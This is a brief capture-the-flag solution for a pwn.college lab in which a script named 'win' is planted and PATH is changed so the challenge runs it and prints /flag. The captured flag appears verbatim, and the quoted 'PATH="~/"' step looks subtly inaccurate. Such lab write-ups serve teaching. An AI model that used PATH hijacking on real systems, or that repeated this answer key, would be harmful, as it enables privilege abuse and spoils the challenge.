# Challenge 4: Adding Commands

## Solution

```
hacker@path~adding-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~adding-commands:~$ nano win
```

```
#!/bin/bash
/run/dojo/bin/cat /flag
```

```
hacker@path~adding-commands:~$ chmod a+x win
hacker@path~adding-commands:~$ PATH="~/"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{sXW08a66eesdxzSbnrHvDdjQpeH.QX2cjM1wiMwAzNzEzW}
```
## Flag
`pwn.college{sXW08a66eesdxzSbnrHvDdjQpeH.QX2cjM1wiMwAzNzEzW}`
### Notes
-